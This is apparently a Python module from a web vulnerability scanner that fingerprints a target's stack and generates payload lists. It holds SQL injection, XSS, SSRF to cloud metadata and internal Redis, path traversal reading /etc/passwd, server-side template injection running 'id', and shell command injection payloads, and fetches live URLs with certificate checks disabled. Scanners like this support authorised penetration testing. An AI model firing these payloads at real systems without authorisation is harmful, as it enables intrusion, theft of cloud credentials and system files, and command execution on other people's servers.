"""AI-Assisted Payload Generator — intelligent context-aware payload generation.

Uses pattern analysis and context awareness to generate targeted payloads
for specific vulnerability types and application contexts.
"""

from __future__ import annotations

import json
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs

from .findings import Finding
from ..core.logger import logger
from ..core.ratelimit import get_limiter


# ---------------------------------------------------------------------------
# Context detection patterns
# ---------------------------------------------------------------------------

TECH_PATTERNS = {
    "php": [r'\.php', r'PHPSESSID', r'X-Powered-By.*PHP', r'wp-content'],
    "python": [r'\.py', r'django', r'flask', r'FastAPI', r'gunicorn'],
    "java": [r'\.jsp', r'\.do', r'\.action', r'JSESSIONID', r'Spring'],
    "node": [r'\.js', r'express', r'next', r'nuxt', r'node_modules'],
    "ruby": [r'\.rb', r'ruby', r'rails', r'rack'],
    "dotnet": [r'\.aspx', r'\.asp', r'ASP.NET', r'__VIEWSTATE'],
    "go": [r'\.go', r'Go-http-client'],
}

VULN_CONTEXT_PATTERNS = {
    "sqli": {
        "indicators": [r'id=', r'user=', r'order=', r'category=', r'search=', r'q=', r'item='],
        "dbms_hints": {
            "mysql": [r'mysql', r'mariadb', r'php', r'wordpress'],
            "postgresql": [r'postgres', r'pg_', r'python', r'django', r'rails'],
            "mssql": [r'asp\.net', r'mssql', r'sqlserver', r'IIS'],
            "oracle": [r'oracle', r'ora_', r'java', r'jsp'],
            "sqlite": [r'sqlite', r'\.db', r'python', r'flask'],
        },
    },
    "xss": {
        "indicators": [r'search=', r'q=', r'name=', r'comment=', r'message=', r'text='],
        "contexts": {
            "html": [r'<html', r'<body', r'<div'],
            "attribute": [r'style=', r'class=', r'id=', r'value='],
            "javascript": [r'<script', r'var\s', r'function\s', r'const\s'],
            "url": [r'href=', r'src=', r'action=', r'url='],
        },
    },
    "ssrf": {
        "indicators": [r'url=', r'uri=', r'link=', r'fetch=', r'load=', r'callback=', r'redirect='],
    },
    "traversal": {
        "indicators": [r'file=', r'path=', r'page=', r'include=', r'doc=', r'template='],
    },
    "ssti": {
        "indicators": [r'template=', r'tmpl=', r'name=', r'view=', r'render='],
        "frameworks": {
            "jinja2": [r'python', r'flask', r'django'],
            "twig": [r'php', r'symfony', r'drupal'],
            "freemarker": [r'java', r'spring'],
            "erb": [r'ruby', r'rails'],
        },
    },
    "cmdi": {
        "indicators": [r'cmd=', r'exec=', r'command=', r'ping=', r'host=', r'ip='],
    },
}


class AIAssistPayloadGenerator:
    """Generates context-aware payloads based on target analysis."""

    NAME = "ai_assist"

    def __init__(self):
        pass

    def analyze_and_generate(self, url: str, response_body: str = "", headers: Dict[str, str] = None) -> Dict[str, Any]:
        """Analyze a target and generate context-aware payloads.

        Args:
            url: Target URL
            response_body: Response body content for context detection
            headers: Response headers for technology detection

        Returns:
            Dict with detected context and generated payloads
        """
        result = {
            "url": url,
            "technologies": [],
            "vuln_contexts": [],
            "payloads": {},
            "confidence": "LOW",
        }

        if not headers:
            headers = {}

        # Step 1: Detect technologies
        result["technologies"] = self._detect_technologies(url, response_body, headers)

        # Step 2: Detect vulnerability contexts
        result["vuln_contexts"] = self._detect_vuln_contexts(url, response_body, result["technologies"])

        # Step 3: Generate payloads based on context
        for ctx in result["vuln_contexts"]:
            vuln_type = ctx["type"]
            payloads = self._generate_payloads(vuln_type, ctx, result["technologies"])
            if payloads:
                result["payloads"][vuln_type] = payloads

        # Step 4: Calculate confidence
        if result["technologies"] and result["vuln_contexts"]:
            result["confidence"] = "HIGH"
        elif result["technologies"] or result["vuln_contexts"]:
            result["confidence"] = "MEDIUM"

        return result

    def scan_url(self, url: str, **kwargs) -> List[Finding]:
        """Scanner interface — analyze URL and report context findings."""
        import httpx

        findings: List[Finding] = []

        try:
            client = httpx.Client(verify=False, timeout=10, follow_redirects=True,
                                  headers={"User-Agent": "Mozilla/5.0"})
            try:
                resp = client.get(url)
                result = self.analyze_and_generate(url, resp.text, dict(resp.headers))
            finally:
                client.close()
        except Exception:
            result = self.analyze_and_generate(url)

        # Report technologies
        if result["technologies"]:
            findings.append(Finding(
                vuln_type="AI Analysis",
                title=f"Technology stack: {', '.join(result['technologies'])}",
                severity="INFO",
                url=url,
                evidence=f"Technologies: {', '.join(result['technologies'])}",
                description=f"Detected technologies: {', '.join(result['technologies'])}. Payloads adapted to stack.",
                tool=self.NAME, confidence="HIGH",
            ))

        # Report vulnerability contexts
        for ctx in result["vuln_contexts"]:
            vuln_type = ctx["type"]
            payloads = result["payloads"].get(vuln_type, [])
            param = ctx.get("parameter", "unknown")

            findings.append(Finding(
                vuln_type="AI Analysis",
                title=f"Vulnerability context: {vuln_type} (param: {param})",
                severity="INFO",
                url=url,
                parameter=param,
                evidence=f"Context: {json.dumps(ctx)[:300]}",
                description=f"AI detected {vuln_type} context in parameter '{param}'. Generated {len(payloads)} targeted payloads.",
                tool=self.NAME, confidence=result["confidence"],
            ))

        return findings

    def get_payloads(self, url: str, response_body: str = "", headers: Dict[str, str] = None) -> Dict[str, List[str]]:
        """Get generated payloads for a URL (programmatic API)."""
        result = self.analyze_and_generate(url, response_body, headers)
        return result.get("payloads", {})

    def _detect_technologies(self, url: str, body: str, headers: Dict[str, str]) -> List[str]:
        """Detect technology stack from URL, body, and headers."""
        techs = set()
        combined = f"{url} {body[:5000]} {json.dumps(headers)}"

        for tech, patterns in TECH_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    techs.add(tech)
                    break

        return list(techs)

    def _detect_vuln_contexts(self, url: str, body: str, technologies: List[str]) -> List[Dict[str, Any]]:
        """Detect likely vulnerability contexts."""
        contexts = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for param_name, param_values in params.items():
            param_value = param_values[0] if param_values else ""

            for vuln_type, config in VULN_CONTEXT_PATTERNS.items():
                # Check if parameter name matches indicators
                for indicator in config.get("indicators", []):
                    if re.search(indicator, f"{param_name}=", re.IGNORECASE):
                        ctx = {
                            "type": vuln_type,
                            "parameter": param_name,
                            "value": param_value,
                            "confidence": "MEDIUM",
                        }

                        # Add DBMS hint for SQLi
                        if vuln_type == "sqli" and "dbms_hints" in config:
                            for dbms, hints in config["dbms_hints"].items():
                                for hint in hints:
                                    if re.search(hint, f"{url} {body[:2000]}", re.IGNORECASE):
                                        ctx["dbms"] = dbms
                                        ctx["confidence"] = "HIGH"
                                        break

                        # Add framework hint for SSTI
                        if vuln_type == "ssti" and "frameworks" in config:
                            for framework, hints in config["frameworks"].items():
                                for hint in hints:
                                    if re.search(hint, " ".join(technologies), re.IGNORECASE):
                                        ctx["framework"] = framework
                                        ctx["confidence"] = "HIGH"
                                        break

                        # Add context hint for XSS
                        if vuln_type == "xss" and "contexts" in config:
                            for xss_ctx, hints in config["contexts"].items():
                                for hint in hints:
                                    if re.search(hint, body[:2000], re.IGNORECASE):
                                        ctx["xss_context"] = xss_ctx
                                        break

                        contexts.append(ctx)
                        break

        return contexts

    def _generate_payloads(self, vuln_type: str, ctx: Dict[str, Any], technologies: List[str]) -> List[str]:
        """Generate payloads based on vulnerability type and context."""
        payloads = []

        if vuln_type == "sqli":
            payloads.extend(self._gen_sqli_payloads(ctx, technologies))
        elif vuln_type == "xss":
            payloads.extend(self._gen_xss_payloads(ctx))
        elif vuln_type == "ssrf":
            payloads.extend(self._gen_ssrf_payloads(ctx))
        elif vuln_type == "traversal":
            payloads.extend(self._gen_traversal_payloads(ctx, technologies))
        elif vuln_type == "ssti":
            payloads.extend(self._gen_ssti_payloads(ctx))
        elif vuln_type == "cmdi":
            payloads.extend(self._gen_cmdi_payloads(ctx, technologies))

        return payloads

    def _gen_sqli_payloads(self, ctx: Dict[str, Any], techs: List[str]) -> List[str]:
        dbms = ctx.get("dbms", "generic")
        payloads = ["'", "\"", "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--"]

        if dbms == "mysql":
            payloads.extend(["' AND 1=CONVERT(int,@@version)--", "' UNION SELECT 1,@@version,3--"])
        elif dbms == "postgresql":
            payloads.extend(["' AND 1=CAST((SELECT version()) AS int)--", "' UNION SELECT 1,version(),3--"])
        elif dbms == "mssql":
            payloads.extend(["' AND 1=CONVERT(int,@@version)--", "'; WAITFOR DELAY '0:0:3'--"])
        elif dbms == "oracle":
            payloads.extend(["' UNION SELECT banner FROM v$version WHERE ROWNUM=1--"])

        if "php" in techs or "wordpress" in techs:
            payloads.extend(["' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"])
        if "python" in techs:
            payloads.extend(["' OR '1'='1'--", "' UNION SELECT 1,sqlite_version(),3--"])

        return payloads

    def _gen_xss_payloads(self, ctx: Dict[str, Any]) -> List[str]:
        xss_ctx = ctx.get("xss_context", "html")
        payloads = []

        if xss_ctx == "html":
            payloads.extend([
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ])
        elif xss_ctx == "attribute":
            payloads.extend([
                '" onmouseover="alert(1)"',
                "' onmouseover='alert(1)'",
                '" autofocus onfocus="alert(1)"',
            ])
        elif xss_ctx == "javascript":
            payloads.extend([
                "'-alert(1)-'",
                "\";alert(1)//",
                "${alert(1)}",
            ])
        elif xss_ctx == "url":
            payloads.extend([
                "javascript:alert(1)",
                "data:text/html,<script>alert(1)</script>",
            ])

        return payloads

    def _gen_ssrf_payloads(self, ctx: Dict[str, Any]) -> List[str]:
        return [
            "http://127.0.0.1/",
            "http://localhost/",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "gopher://127.0.0.1:6379/",
        ]

    def _gen_traversal_payloads(self, ctx: Dict[str, Any], techs: List[str]) -> List[str]:
        payloads = ["../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd"]
        if "php" in techs:
            payloads.extend(["php://filter/convert.base64-encode/resource=/etc/passwd"])
        if "dotnet" in techs:
            payloads.extend(["..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"])
        return payloads

    def _gen_ssti_payloads(self, ctx: Dict[str, Any]) -> List[str]:
        framework = ctx.get("framework", "generic")
        payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>"]

        if framework == "jinja2":
            payloads.extend([
                "{{config}}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
            ])
        elif framework == "twig":
            payloads.extend(["{{_self}}", "{{7*'7'}}"])
        elif framework == "freemarker":
            payloads.extend(["${7*7}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }"])

        return payloads

    def _gen_cmdi_payloads(self, ctx: Dict[str, Any], techs: List[str]) -> List[str]:
        payloads = [";id", "|id", "`id`", "$(id)"]
        if "php" in techs:
            payloads.extend([";php -r 'system(\"id\");'"])
        if "dotnet" in techs:
            payloads.extend(["& whoami", "| dir"])
        return payloads


__all__ = ["AIAssistPayloadGenerator"]
